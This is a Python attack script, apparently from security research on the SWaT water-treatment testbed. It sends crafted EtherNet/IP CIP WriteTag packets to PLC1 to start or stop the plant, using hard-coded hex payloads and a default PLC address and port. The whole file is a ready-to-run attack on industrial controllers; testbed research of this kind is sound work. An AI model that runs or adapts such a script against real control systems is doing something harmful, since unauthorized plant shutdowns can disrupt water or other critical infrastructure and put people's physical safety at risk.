'''
swat_control.py
An attack script that can control the start or stop the SWaT Plant via sending
specially crafted packets to the PLC which are connected to other PLCs,
in this case PLC1 which will determine the state of other PLCs.
Made with help using cip.py and enip_tcp.py from scapy-cip-enip dissector
to craft and dissect the packets:
https://github.com/scy-phy/scapy-cip-enip

Author: Goh Yee Kit
Email: yeek3063@gmail.com
'''
import binascii
import logging
import sys
import time
import socket
import argparse
from datetime import datetime
from os.path import basename
from scapy import all as scapy

from cip import CIP, CIP_RespForwardOpen
from enip_tcp import ENIP_TCP, ENIP_RegisterSession, ENIP_SendRRData, \
    ENIP_SendUnitData_Item, ENIP_SendUnitData, ENIP_ConnectionAddress, \
    ENIP_ConnectionPacket

logging.basicConfig(format='[%(levelname)s] %(message)s', level=logging.DEBUG)
logger = logging.getLogger(__name__)

# Global switch to make it easy to test without sending anything
NO_NETWORK = False


class PLCClient(object):
    '''
    Handle all the state of an Ethernet/IP session with the PLC
    '''

    def __init__(self, plc_addr, plc_port):
        if not NO_NETWORK:
            try:
                self.sock = socket.create_connection((plc_addr, plc_port),
                                                     timeout=10)
            except socket.error as exc:
                logger.warning("socket error: %s", exc)
                logger.warning("Continuing without sending anything")
                self.sock = None
        else:
            self.sock = None
        self.session_id = 0
        self.enip_connid = 0
        self.sequence = 1

        # Open an Ethernet/IP session
        sessionpkt = ENIP_TCP() / ENIP_RegisterSession()
        if self.sock is not None:
            self.sock.send(bytes(sessionpkt))
            reply_pkt = self.recv_enippkt()
            self.session_id = reply_pkt.session

    @property
    def connected(self):
        if not NO_NETWORK:
            return True if self.sock else False
        else:
            return True

    def send_rr_cip(self, cippkt):
        '''
        Send a CIP packet over the TCP connection as an ENIP Req/Rep Data
        '''
        enippkt = ENIP_TCP(session=self.session_id)
        enippkt /= ENIP_SendRRData(items=[
            ENIP_SendUnitData_Item(type_id=0),
            ENIP_SendUnitData_Item() / cippkt
        ])
        if self.sock is not None:
            self.sock.send(bytes(enippkt))

    def send_unit_cip(self, cippkt):
        '''
        Send a CIP packet over the TCP connection as an ENIP Unit Data
        '''
        enippkt = ENIP_TCP(session=self.session_id)
        enippkt /= ENIP_SendUnitData(
            items=[ENIP_SendUnitData_Item() /
                   ENIP_ConnectionAddress(connection_id=self.enip_connid),
                   ENIP_SendUnitData_Item() /
                   ENIP_ConnectionPacket(sequence=self.sequence) / cippkt])
        self.sequence += 1
        if self.sock is not None:
            self.sock.send(bytes(enippkt))

    def send_forward_open(self, cippkt):
        '''
        Sends a forward open request packet to PLC to initiate a session
        '''
        self.send_rr_cip(cippkt)
        resppkt = self.recv_enippkt()
        status = self.get_cip_status(resppkt)
        if status != b'\x00':
            logger.error(
                "Failed to Forward Open CIP Connection: %r", status)
            return False
        cippkt = resppkt[CIP]
        assert isinstance(cippkt.payload, CIP_RespForwardOpen)
        enip_connid = self.get_enip_connid(self, resppkt)
        self.enip_connid = enip_connid
        print("Established Forward Open CIP Connection: {}"
              .format(hex(enip_connid)))
        return True

    def send_forward_close(self, cippkt):
        '''
        Send a forward close request packet to plc to close session
        '''
        self.send_rr_cip(cippkt)
        resppkt = self.recv_enippkt()
        status = self.get_cip_status(resppkt)
        if status != b'\x00':
            logger.error(
                "Failed to Forward Close CIP Connection: %r", status)
            return False
        print("Closed Forward Open CIP Connection: {}".format(
            hex(self.enip_connid)))
        return True

    def send_payloads(self, payloads):
        '''
        Sends payload via CIP send unit data requests
        '''
        count = 1
        for payload in payloads:
            print("Sending Payload {}".format(count))
            self.send_unit_cip(payload)
            count += 1
            # Receive the response
            resppkt = self.recv_enippkt()
            status = self.get_cip_status(resppkt)
            if status != b'\x00':
                logger.error("Sending Payload Failed: %r", status)
                cippkt = resppkt[CIP]
                cippkt.show()
            else:
                print("Success!")
            # 50ms delay before second payload
            time.sleep(0.05)
        return True

    def recv_enippkt(self):
        '''
        Receive an ENIP packet from the TCP socket
        '''
        if self.sock is None:
            return
        pktbytes = self.sock.recv(2000)
        pkt = ENIP_TCP(pktbytes)
        return pkt

    def close_connection(self):
        '''
        Closes the socket connection to the PLC
        '''
        if not NO_NETWORK:
            print("Closed Session: {}".format(hex(self.session_id)))
            self.sock.shutdown(1)
            self.sock.close()
        return True

    @staticmethod
    def get_hex_list(pkt):
        '''
        Returns a list of hex values from packet
        '''
        hex_list = scapy.hexstr(pkt).split()
        return hex_list

    @staticmethod
    def convert_hex_list_to_int(input_list):
        '''
        Returns the int value of a hex list after concatenating and reversing
        '''
        rev_input_list = reversed(input_list)
        value = int(''.join(rev_input_list), 16)
        return value

    @staticmethod
    def get_enip_connid(self, resppkt):
        '''
        Returns the enip connection id
        '''
        enip_connid = 0
        if CIP in resppkt:
            cippkt = resppkt[CIP]
            if cippkt.haslayer(scapy.Raw):
                hex_cippkt_list = self.get_hex_list(cippkt)
                enip_connid_hex_list = hex_cippkt_list[4:8]
                enip_connid = self.convert_hex_list_to_int(
                    enip_connid_hex_list)
        return enip_connid

    @staticmethod
    def get_cip_status(resppkt):
        '''
        Returns the status of the CIP response packet
        '''
        status = b'\x00'
        if CIP in resppkt:
            cippkt = resppkt[CIP]
            if cippkt.haslayer(scapy.Raw):
                load = cippkt.load
                status = load[2:3]
        return status


def get_raw_pkts():
    '''
    Returns a dictionary of RAW CIP packets in hex form
    '''
    start_payload1 = binascii.unhexlify('4d04206b2500c0b32801c1000100ff')
    start_payload2 = binascii.unhexlify('4d04206b2500c0b32801c100010000')
    stop_payload1 = binascii.unhexlify('4d04206b2500c0b32802c1000100ff')
    stop_payload2 = binascii.unhexlify('4d04206b2500c0b32802c100010000')
    fwopen = binascii.unhexlify('540220062401069b000000000d470080'
                                '0d474d006c4488130200000080841e00'
                                'f84380841e00f843a303010020022401')
    fwclose = binascii.unhexlify('4e022006240100f90d474d006c448813'
                                 '0300010020022401')
    rawpkts = {
        "start_payload1": start_payload1,
        "start_payload2": start_payload2,
        "stop_payload1": stop_payload1,
        "stop_payload2": stop_payload2,
        "fwopen": fwopen,
        "fwclose": fwclose
    }
    return rawpkts


def construct_cip_pkts():
    '''
    Encapsulate the raw packets in CIP
    '''
    rawpkts = get_raw_pkts()
    cippkts = {}
    for key in rawpkts:
        cippkts[key] = CIP(rawpkts[key])
    return cippkts


def get_payloads(pkts, func):
    '''
    Returns payloads based on FUNC type
    0 = stop plant
    1 = start plant
    2 = interactive, ask user input to start/stop
    '''
    if func == 0:
        print("FUNC 0 - Stop Plant")
        payloads = [pkts["stop_payload1"], pkts["stop_payload2"]]
        return payloads
    if func == 1:
        print("FUNC 1 - Start Plant")
        payloads = [pkts["start_payload1"], pkts["start_payload2"]]
        return payloads
    if func == 2:
        print("FUNC 2 - Interactive")
        choice = input("Start/Stop Plant? > ")
        while choice.lower != "start" or choice.lower != "stop":
            if choice.lower() == "start":
                payloads = [pkts["start_payload1"], pkts["start_payload2"]]
                return payloads
            elif choice.lower() == "stop":
                payloads = [pkts["stop_payload1"], pkts["stop_payload2"]]
                return payloads
            else:
                choice = input("Start/Stop Plant?")


def connect_plc(ip, port):
    '''
    Creates a socket object which connects to the plc
    '''
    client = PLCClient(ip, port)
    if not client.connected:
        sys.exit(1)
    print("Established Session: {}".format(hex(client.session_id)))
    return client


def wait(t, msg):
    '''
    Waits for t seconds and prints msg
    '''
    for i in reversed(range(0, t)):
        time.sleep(1)
        print(f"{msg} {i}", end="\r", flush=True)
    print()


def get_argparse():
    '''
    Creates Arg Parse object
    '''
    parser = argparse.ArgumentParser(
        description="Python Script to Start/Stop the SWaT Plant")
    parser.add_argument(
        "function", choices=["start", "stop"],
        help="Function: [Start/Stop] the Plant")
    parser.add_argument(
        "-ip", help="IP of PLC to connect to", type=str,
        default="192.168.1.10")
    parser.add_argument(
        "-port", help="Port of PLC to connect to", type=int, default=44818)
    args = parser.parse_args()
    return args


def main():
    '''
    Main Function
    '''

    # Get Commandline arguments via argparse
    args = get_argparse()
    plc_port = None
    function = args.function
    if function == "stop":
        func = 0
    elif function == "start":
        func = 1
    elif function == "int":
        func = 2
    plc_ip = args.ip
    plc_port = args.port

    print("{} Started: {}".format(basename(__file__), datetime.now()))

    # Construct CIP packets and get Payloads to send
    pkts = construct_cip_pkts()
    payloads = get_payloads(pkts, func)

    # Connect to PLC
    client = connect_plc(plc_ip, plc_port)

    # Send forward open request
    fwopenpkt = pkts["fwopen"]
    if not client.send_forward_open(fwopenpkt):
        sys.exit(1)

    # Waits for 2 seconds before sending payload
    wait(2, msg="Sending Payload in")

    # Send CIP WriteTag request for payloads
    client.send_payloads(payloads)

    # Waits for 5 seconds before closing connections
    wait(5, msg="Closing Connection in")

    # Close the connection
    fwclosepkt = pkts["fwclose"]
    client.send_forward_close(fwclosepkt)
    client.close_connection()


if __name__ == '__main__':
    main()
